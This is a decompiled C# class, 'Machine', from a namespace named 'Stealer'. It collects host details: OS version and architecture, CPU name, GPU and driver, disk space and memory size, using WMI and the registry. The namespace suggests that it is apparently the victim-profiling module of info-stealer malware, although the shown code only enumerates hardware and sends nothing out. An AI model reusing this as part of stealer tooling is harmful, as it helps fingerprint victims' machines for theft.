using System;
using System.IO;
using System.Management;
using Microsoft.Win32;

namespace Stealer
{
	// Token: 0x0200000E RID: 14
	internal class Machine
	{
		// Token: 0x0600003C RID: 60 RVA: 0x00003C44 File Offset: 0x00001E44
		public Machine()
		{
			this.OSInfo();
			this.ProcessorInfo();
			this.GPUInfo();
			this.Disk();
			this.Memory();
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003CD0 File Offset: 0x00001ED0
		private static string SizeSuffix(long value)
		{
			if (value < 0L)
			{
				return "-" + Machine.SizeSuffix(-value);
			}
			if (value == 0L)
			{
				return "0.0 bytes";
			}
			int num = (int)Math.Log((double)value, 1024.0);
			decimal num2 = value / (1L << num * 10);
			return string.Format("{0:n1} {1}", num2, Machine.SizeSuffixes[num]);
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00003D44 File Offset: 0x00001F44
		private void OSInfo()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (managementObject["Caption"] != null)
				{
					this.osName = managementObject["Caption"].ToString();
				}
				if (managementObject["OSArchitecture"] != null)
				{
					this.osArchitecture = managementObject["OSArchitecture"].ToString();
				}
				if (managementObject["Version"] != null)
				{
					this.osVersion = managementObject["Version"].ToString();
				}
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003E04 File Offset: 0x00002004
		private void ProcessorInfo()
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
			if (registryKey != null && registryKey.GetValue("ProcessorNameString") != null)
			{
				this.processName = registryKey.GetValue("ProcessorNameString").ToString();
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00003E48 File Offset: 0x00002048
		private void GPUInfo()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				this.gpuVideo = managementObject["VideoProcessor"].ToString();
				this.gpuVersion = managementObject["DriverVersion"].ToString();
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00003ECC File Offset: 0x000020CC
		private void Disk()
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					this.diskDetails += string.Format("Drive {0}\\ - {1}", driveInfo.Name, Machine.SizeSuffix(driveInfo.AvailableFreeSpace) + "/" + Machine.SizeSuffix(driveInfo.TotalSize) + "\\n");
				}
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00003F44 File Offset: 0x00002144
		private void Memory()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
			long num = 0L;
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				num += Convert.ToInt64(managementObject.Properties["Capacity"].Value);
			}
			this.pcMemory = Machine.SizeSuffix(num);
		}

		// Token: 0x0400003E RID: 62
		private static readonly string[] SizeSuffixes = new string[]
		{
			"bytes",
			"KB",
			"MB",
			"GB",
			"TB",
			"PB",
			"EB",
			"ZB",
			"YB"
		};

		// Token: 0x0400003F RID: 63
		public string osName = string.Empty;

		// Token: 0x04000040 RID: 64
		public string osArchitecture = string.Empty;

		// Token: 0x04000041 RID: 65
		public string osVersion = string.Empty;

		// Token: 0x04000042 RID: 66
		public string processName = string.Empty;

		// Token: 0x04000043 RID: 67
		public string gpuVideo = string.Empty;

		// Token: 0x04000044 RID: 68
		public string gpuVersion = string.Empty;

		// Token: 0x04000045 RID: 69
		public string diskDetails = string.Empty;

		// Token: 0x04000046 RID: 70
		public string pcMemory = string.Empty;
	}
}
